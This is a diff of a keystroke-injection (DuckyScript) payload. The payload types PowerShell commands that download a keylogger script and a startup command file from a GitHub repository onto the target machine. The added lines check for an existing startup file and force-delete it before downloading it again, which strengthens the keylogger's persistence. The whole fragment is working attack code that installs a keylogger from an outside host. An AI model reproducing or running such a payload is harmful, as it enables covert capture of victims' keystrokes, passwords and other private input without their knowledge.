@@ -46,6 +46,18 @@ DELAY 200
 STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/keylogger.py" -OutFile $dest
 ENTER
 DELAY 200
+STRING $StartupCmd = Test-Path -Path $filedest
+ENTER
+DELAY 200
+STRING if ($StartupCmd){
+ENTER
+DELAY 200
+STRING remove-Item -Force -Path $filedest
+ENTER
+DELAY 200
+STRING }
+ENTER
+DELAY 200
 STRING Invoke-WebRequest -Uri "https://github.com/ASL-rgb/keylogger/blob/main/bootup.cmd" -OutFile $filedest
 ENTER
 DELAY 200
